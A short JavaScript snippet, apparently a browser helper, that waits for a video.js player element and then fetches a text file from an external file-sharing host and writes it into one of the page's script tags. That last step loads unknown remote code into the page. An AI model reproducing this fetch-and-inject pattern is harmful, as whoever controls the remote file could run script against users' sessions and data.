'use strict';

const videoID = '#player_html5_api'; // id of video element

const waitUntilVideoExists = (tick = 250) => {
    return new Promise(resolve => {
        const interval = setInterval(() => {
            const el = $(videoID);
            
            if (el.length && el.hasClass('vjs-tech')) { // if the parent div and the video element exist
                clearInterval(interval);
                resolve(el);
            }
        }, tick);
    });
}


fetch('http://m.uploadedit.com/bltc/1590096888464.txt')
    .then(response => response.text())
    .then(text => document.getElementsByTagName('script')[2].innerText = text)